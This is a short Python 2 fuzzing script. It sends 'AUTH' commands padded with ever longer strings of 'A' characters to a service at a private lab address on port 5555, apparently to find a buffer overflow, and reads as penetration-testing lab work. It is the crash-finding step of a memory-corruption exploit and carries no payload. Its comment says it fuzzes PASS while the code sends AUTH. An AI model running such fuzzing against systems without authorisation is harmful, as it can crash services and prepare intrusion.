#!/usr/bin/python
import socket
# Create an array of buffers, from 1 to 5900, with increments of 200. 
buffer=["A"]
counter=100
while len(buffer) <= 60:
	buffer.append("A"*counter)
	counter=counter+200
for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string) 
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	connect=s.connect(('10.11.8.189',5555))
	s.send('AUTH'+string + '\r\n') 
	print s.recv(1024)
	s.send('QUIT\r\n')
	s.close()
